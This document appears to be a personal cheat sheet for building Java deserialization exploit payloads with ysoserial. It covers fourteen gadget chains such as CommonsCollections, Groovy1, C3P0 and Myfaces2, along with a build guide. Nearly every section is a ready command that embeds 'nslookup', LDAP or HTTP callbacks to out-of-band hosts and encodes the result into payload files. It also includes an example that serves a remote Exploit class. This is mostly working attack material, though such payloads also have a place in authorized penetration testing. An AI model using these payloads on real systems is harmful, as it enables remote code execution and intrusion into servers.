- path
```
/Users/rahulacharya/Tools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
```
# Index
1. AspectJWeaver
2. BeanShell1
3. C3P0
4. Clojure
5. CommonsCollections1
6. CommonsCollections5
7. CommonsCollections6
8. CommonsCollections7
9. Groovy1
10. Hibernate2
11. JRMPClient
12. Myfaces1
13. Myfaces2
14. URLDNS
##### ALL
- AspectJWeaver
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'nslookup d1bsma0ckt03hq9ngutgtk9mk94pcqc35.oast.pro' > tmp_payload.ser
base64 -i tmp_payload.ser | tr -d '\n' > tmp_payload.b64
PAYLOAD=$(cat tmp_payload.b64)
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar AspectJWeaver "evil.txt;$PAYLOAD" > final_payload.ser
base64 -i final_payload.ser | tr -d '\n' > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt

rm tmp_payload.ser
rm tmp_payload.b64
rm final_payload.ser
rm final_payload.b64
```
- BeanShell1
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'nslookup d1bsma0ckt03hq9ngutgtk9mk94pcqc35.oast.pro' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
echo "" >> ysoserial_b64_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- C3P0
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 'ldap://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live/a:foo' 2>/dev/null | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- Clojure
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Clojure 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- CommonsCollections1
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- CommonsCollections5
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- CommonsCollections6
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- CommonsCollections7
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- Groovy1
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'  2>/dev/null | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- Hibernate2
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate2 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live' | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- JRMPClient
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- Myfaces1
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces1 'nslookup d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- Myfaces2
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces2 'http://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live'   | base64  > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
- ✅ Correct Usage Example
```
python3 -m http.server 8080
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces2 http://<your-ip>:8080/:Exploit | base64
```
- URLDNS
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://d1btpt8ckt0eb3qmeaqgogmozxhps7mh5.oast.live | base64 | base64 > final_payload.b64
python3 -c 'import urllib.parse; print(urllib.parse.quote(open("final_payload.b64").read()))' >> ysoserial_url_payload.txt
cat final_payload.b64 >> ysoserial_b64_payload.txt
rm final_payload.b64
```
### Installation guide
```
1. Clone the official repo
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial

Make sure you have Maven installed:
brew install maven
mvn -v

✅ Fix: Modify this part in your pom.xml
🔎 Find:
<configuration>
  <!-- maximize compatibility -->
  <source>1.6</source>
  <target>1.6</target>
  <!-- ignore noisy internal api warnings -->
  <compilerArgument>-XDignore.symbol.file</compilerArgument>
  <fork>true</fork>
</configuration>

✏️ Replace with:
<configuration>
  <source>1.8</source>
  <target>1.8</target>
  <compilerArgument>-XDignore.symbol.file</compilerArgument>
  <fork>true</fork>
</configuration>

brew install --cask temurin@11
export JAVA_HOME=$(/usr/libexec/java_home -v 11)
echo 'export JAVA_HOME=$(/usr/libexec/java_home -v 11)' >> ~/.zshrc
source ~/.zshrc
java -version

mvn clean package -DskipTests

java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar

java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar <payload> '<command>'
```